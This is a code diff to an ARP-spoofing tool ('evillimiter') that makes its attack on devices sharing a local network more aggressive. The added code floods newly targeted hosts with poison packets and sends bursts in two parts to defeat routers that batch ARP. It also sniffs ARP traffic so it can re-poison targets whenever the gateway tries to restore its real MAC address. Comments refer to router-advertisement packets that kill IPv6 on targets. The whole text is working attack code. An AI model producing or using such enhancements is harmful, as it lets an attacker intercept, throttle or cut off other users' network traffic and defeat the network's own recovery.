@@ -2,7 +2,7 @@ import time
 import warnings
 import threading
 from scapy.all import (  # pylint: disable=no-name-in-module
-    Ether, ARP, IPv6, conf, get_if_hwaddr,
+    Ether, ARP, IPv6, conf, get_if_hwaddr, sniff,
     ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo
 )
 
@@ -15,7 +15,7 @@ from evillimiter.common.globals import BROADCAST
 
 
 class ARPSpoofer(object):
-    def __init__(self, interface, gateway_ip, gateway_mac, interval=0.1, burst_count=15):
+    def __init__(self, interface, gateway_ip, gateway_mac, interval=0.08, burst_count=20):
         self.interface = interface
         self.gateway_ip = gateway_ip
         self.gateway_mac = gateway_mac
@@ -24,26 +24,36 @@ class ARPSpoofer(object):
         self._attacker_mac = get_if_hwaddr(interface)
 
         # interval in seconds between spoofed ARP packet cycles
-        # 0.1s = 10 cycles/sec — very aggressive, outpaces IndiHome router ARP refresh
+        # 0.08s = 12.5 cycles/sec — more aggressive, outpaces router ARP refresh
         self.interval = interval
 
         # number of times each ARP packet is sent per cycle
-        # 15× burst — overwhelms router's ARP cache entry before re-learn
+        # 20× burst — overwhelms router's ARP cache entry before re-learn
         self.burst_count = burst_count
+
+        # initial storm: when first poisoning a target, send this many bursts
+        # to rapidly establish our position in the ARP cache
+        self._initial_storm_count = 50
 
         # derive gateway's IPv6 link-local address from its MAC (EUI-64)
         # used for RA spoofing to kill IPv6 on targets
         self._gateway_ipv6_ll = self._mac_to_ipv6_linklocal(gateway_mac)
 
         # send RA kill packets every N ARP cycles (RA doesn't need to be as frequent)
-        # with interval=0.1s and ra_every=6, RA is sent every 0.6 seconds
-        self._ra_every = 6
+        # with interval=0.08s and ra_every=5, RA is sent every 0.4 seconds
+        self._ra_every = 5
         self._ra_cycle = 0
 
         self._hosts = set()
         self._hosts_lock = threading.Lock()
+        self._pending_storm = set()  # hosts that need initial poison storm
+        self._pending_storm_lock = threading.Lock()
         self._running = False
         self._socket = None
+
+        # ARP monitor: detects when gateway tries to reclaim real MAC
+        self._monitor_running = False
+        self._monitor_thread = None
 
     @staticmethod
     def _mac_to_ipv6_linklocal(mac):
@@ -66,11 +76,18 @@ class ARPSpoofer(object):
         with self._hosts_lock:
             self._hosts.add(host)
 
+        # queue initial poison storm for this host
+        with self._pending_storm_lock:
+            self._pending_storm.add(host)
+
         host.spoofed = True
 
     def remove(self, host, restore=True):
         with self._hosts_lock:
             self._hosts.discard(host)
+
+        with self._pending_storm_lock:
+            self._pending_storm.discard(host)
 
         if restore:
             self._restore(host)
@@ -83,8 +100,16 @@ class ARPSpoofer(object):
         thread = threading.Thread(target=self._spoof, args=[], daemon=True)
         thread.start()
 
+        # Start ARP monitor thread to detect gateway reclaiming real MAC
+        self._monitor_running = True
+        self._monitor_thread = threading.Thread(
+            target=self._arp_monitor, args=[], daemon=True
+        )
+        self._monitor_thread.start()
+
     def stop(self):
         self._running = False
+        self._monitor_running = False
 
     def _open_socket(self):
         """Open a persistent L2 raw socket for fast packet injection"""
@@ -228,6 +253,7 @@ class ARPSpoofer(object):
         """
         Main spoofing loop: ARP poisoning (every cycle) + RA kill (every N cycles).
         Uses persistent L2 socket with resilient error handling.
+        Includes initial poison storm for newly added hosts.
         """
         consecutive_errors = 0
         max_consecutive_errors = 10
@@ -242,19 +268,45 @@ class ARPSpoofer(object):
         try:
             while self._running:
                 try:
+                    # --- Initial poison storm for new hosts ---
+                    with self._pending_storm_lock:
+                        storm_hosts = self._pending_storm.copy()
+                        self._pending_storm.clear()
+
+                    for host in storm_hosts:
+                        if not self._running:
+                            return
+                        storm_packets = self._build_l2_packets(host)
+                        for _ in range(self._initial_storm_count):
+                            for pkt in storm_packets:
+                                self._socket.send(pkt)
+                            time.sleep(0.005)  # tiny gap between bursts
+
                     self._hosts_lock.acquire()
                     hosts = self._hosts.copy()
                     self._hosts_lock.release()
 
                     # --- ARP poisoning (every cycle) ---
+                    # Double-tap: send in two micro-bursts with gap
+                    # This defeats routers that process ARP in batches
                     all_arp_packets = []
                     for host in hosts:
                         if not self._running:
                             return
                         all_arp_packets.extend(self._build_l2_packets(host))
 
+                    # First burst
+                    half_burst = max(1, self.burst_count // 2)
                     for pkt in all_arp_packets:
-                        for _ in range(self.burst_count):
+                        for _ in range(half_burst):
+                            self._socket.send(pkt)
+
+                    # Micro-gap between bursts (defeats batch processing)
+                    time.sleep(0.01)
+
+                    # Second burst
+                    for pkt in all_arp_packets:
+                        for _ in range(self.burst_count - half_burst):
                             self._socket.send(pkt)
 
                     # --- RA kill (every N cycles, only for --full hosts) ---
@@ -296,6 +348,92 @@ class ARPSpoofer(object):
                     time.sleep(0.5)
         finally:
             self._close_socket()
+
+    # -------------------------------------------------------------------------
+    # ARP Monitor — detects gateway reclaiming real MAC and immediately re-poisons
+    # -------------------------------------------------------------------------
+
+    def _arp_monitor(self):
+        """
+        Passively sniff ARP traffic to detect when the gateway sends
+        legitimate ARP replies to our spoofed targets, which would
+        undo our poisoning. When detected, immediately re-poison.
+        """
+        def arp_handler(pkt):
+            if not self._monitor_running:
+                return
+            if pkt.haslayer(ARP):
+                arp = pkt[ARP]
+                # Detect: gateway is sending ARP reply with its REAL MAC
+                # This means gateway is trying to reclaim its position
+                if (arp.op == 2 and  # ARP reply
+                    arp.psrc == self.gateway_ip and
+                    arp.hwsrc.lower() == self.gateway_mac.lower() and
+                    arp.hwsrc.lower() != self._attacker_mac.lower()):
+                    # Gateway is advertising its real MAC — re-poison NOW
+                    self._emergency_repoison()
+                # Detect: a target is sending ARP request for gateway
+                # This means target may update cache soon — pre-emptively poison
+                elif arp.op == 1 and arp.pdst == self.gateway_ip:
+                    src_mac = arp.hwsrc.lower()
+                    with self._hosts_lock:
+                        for host in self._hosts:
+                            if host.mac.lower() == src_mac:
+                                self._targeted_repoison(host)
+                                break
+
+        def stop_filter(pkt):
+            return not self._monitor_running
+
+        try:
+            sniff(
+                iface=self.interface,
+                filter='arp',
+                prn=arp_handler,
+                stop_filter=stop_filter,
+                store=0
+            )
+        except Exception:
+            pass
+
+    def _emergency_repoison(self):
+        """
+        Immediately send a burst of poison packets to ALL spoofed hosts.
+        Called when gateway is detected trying to reclaim its real MAC.
+        Uses a fresh socket to avoid interfering with main spoof loop.
+        """
+        try:
+            sock = conf.L2socket(iface=self.interface)
+            try:
+                with self._hosts_lock:
+                    hosts = self._hosts.copy()
+
+                for host in hosts:
+                    packets = self._build_l2_packets(host)
+                    for _ in range(30):  # aggressive burst
+                        for pkt in packets:
+                            sock.send(pkt)
+            finally:
+                sock.close()
+        except Exception:
+            pass
+
+    def _targeted_repoison(self, host):
+        """
+        Send a quick burst of poison packets targeted at a specific host
+        that was detected querying for the gateway's MAC.
+        """
+        try:
+            sock = conf.L2socket(iface=self.interface)
+            try:
+                packets = self._build_l2_packets(host)
+                for _ in range(15):  # moderate burst
+                    for pkt in packets:
+                        sock.send(pkt)
+            finally:
+                sock.close()
+        except Exception:
+            pass
 
     # -------------------------------------------------------------------------
     # Restore (ARP + RA)
